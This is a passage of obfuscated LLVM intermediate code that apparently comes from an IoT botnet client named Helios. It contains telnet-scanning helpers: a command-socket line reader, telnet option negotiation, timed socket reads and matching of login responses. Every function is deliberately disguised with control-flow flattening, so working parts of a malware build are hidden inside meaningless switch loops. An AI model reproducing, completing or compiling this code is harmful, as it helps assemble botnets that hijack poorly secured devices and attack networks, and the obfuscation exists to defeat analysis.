  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1488745129, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1488745129, label %first
    i32 -928536060, label %13
    i32 162350661, label %14
    i32 -282729029, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -928536060, i32 162350661
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -282729029, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -282729029, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 173725673, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 173725673, label %3
    i32 938285697, label %8
    i32 -28885076, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  %7 = select i1 %6, i32 938285697, i32 -28885076
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 173725673, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1076557743, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1076557743, label %6
    i32 1454392484, label %11
    i32 648509865, label %20
    i32 -2009181751, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 1454392484, i32 -2009181751
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 648509865, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 1076557743, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 749975634, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 749975634, label %24
    i32 1125690605, label %33
    i32 -803930438, label %50
    i32 -901534118, label %51
    i32 1081760372, label %55
    i32 1704694741, label %58
    i32 759505478, label %67
    i32 580186389, label %84
    i32 337491255, label %87
    i32 267776471, label %88
    i32 1754371898, label %89
    i32 -1925343697, label %91
    i32 -1938174816, label %96
    i32 -1317972920, label %101
    i32 -1870371561, label %103
    i32 1696371140, label %111
    i32 -1652816200, label %112
    i32 1388360464, label %115
    i32 1454751350, label %118
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 1125690605, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -803930438, i32 1754371898
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 -901534118, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 1081760372, i32 267776471
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  store i32 1704694741, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #2, !srcloc !2
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  store i32 759505478, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  %83 = select i1 %82, i32 580186389, i32 337491255
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %13, align 4
  store i32 -901534118, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 267776471, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 1754371898, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %90 = load i8*, i8** %6, align 8
  store i8* %90, i8** %17, align 8
  store i32 -1925343697, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  %94 = icmp sgt i32 %92, 1
  %95 = select i1 %94, i32 -1938174816, i32 1388360464
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @HeliosCommSock, align 4
  %98 = call i64 @recv(i32 %97, i8* %16, i64 1, i32 0)
  %99 = icmp ne i64 %98, 1
  %100 = select i1 %99, i32 -1317972920, i32 -1870371561
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i8*, i8** %17, align 8
  store i8 0, i8* %102, align 1
  store i32 -1, i32* %4, align 4
  store i32 1454751350, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8, i8* %16, align 1
  %105 = load i8*, i8** %17, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %17, align 8
  store i8 %104, i8* %105, align 1
  %107 = load i8, i8* %16, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = select i1 %109, i32 1696371140, i32 -1652816200
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 1388360464, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %18, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %18, align 4
  store i32 -1925343697, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8*, i8** %17, align 8
  store i8 0, i8* %116, align 1
  %117 = load i32, i32* %18, align 4
  store i32 %117, i32* %4, align 4
  store i32 1454751350, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %4, align 4
  ret i32 %119

loopEnd:                                          ; preds = %115, %112, %111, %103, %101, %96, %91, %89, %88, %87, %84, %67, %58, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #2
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -822770755, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -822770755, label %first
    i32 -2033527440, label %28
    i32 2023537369, label %32
    i32 2017091999, label %38
    i32 844762172, label %39
    i32 -593111733, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 255
  %27 = select i1 %26, i32 -2033527440, i32 2023537369
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @negotiate(i32 %29, i8* %30, i32 3)
  store i32 2023537369, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8*, i8** %9, align 8
  %34 = load i8**, i8*** %11, align 8
  %35 = call i32 @contains_string(i8* %33, i8** %34)
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 2017091999, i32 844762172
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1, i32* %6, align 4
  store i32 -593111733, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -593111733, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %38, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  %switchVar = alloca i32
  store i32 1261579989, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1261579989, label %18
    i32 -453509045, label %27
    i32 -879053221, label %44
    i32 470764512, label %45
    i32 -1700683286, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #2, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  store i32 -453509045, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  %43 = select i1 %42, i32 -879053221, i32 470764512
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1700683286, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %6, align 4
  %47 = load i8*, i8** %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @recv(i32 %46, i8* %47, i64 %49, i32 0)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %5, align 4
  store i32 -1700683286, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  ret i32 %53

loopEnd:                                          ; preds = %45, %44, %27, %18, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1464817831, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -1464817831, label %NodeBlock
    i32 1951156137, label %LeafBlock1
    i32 -34658017, label %LeafBlock
    i32 -360509399, label %16
    i32 209498860, label %17
    i32 -108684558, label %26
    i32 1415654404, label %27
    i32 -653604971, label %34
    i32 -2007677986, label %35
    i32 -1739086835, label %42
    i32 -1059431105, label %50
    i32 200656535, label %58
    i32 -1214394409, label %59
    i32 903823332, label %60
    i32 -1239374654, label %NewDefault
    i32 -713208871, label %67
    i32 -1277524763, label %68
    i32 633616434, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 -34658017, i32 1951156137
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -360509399, i32 -1239374654
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 209498860, i32 -1239374654
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 633616434, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 -108684558, i32 1415654404
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 903823332, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 -653604971, i32 -2007677986
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 -1214394409, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 -1739086835, i32 -1059431105
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 200656535, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 200656535, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -1214394409, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 903823332, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 -1277524763, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -713208871, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -1277524763, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 633616434, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 541368284, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 541368284, label %8
    i32 -1737826035, label %17
    i32 -689538576, label %18
    i32 1728468685, label %19
    i32 -1377926426, label %24
    i32 2022698393, label %34
    i32 -1221415757, label %35
    i32 -1905253054, label %36
    i32 -1336497805, label %39
    i32 -1662814656, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  %16 = select i1 %15, i32 -1737826035, i32 -689538576
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 541368284, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 1728468685, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %7, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %20, %21
  %23 = select i1 %22, i32 -1377926426, i32 -1336497805
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  %33 = select i1 %32, i32 2022698393, i32 -1221415757
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -1662814656, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 -1905253054, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
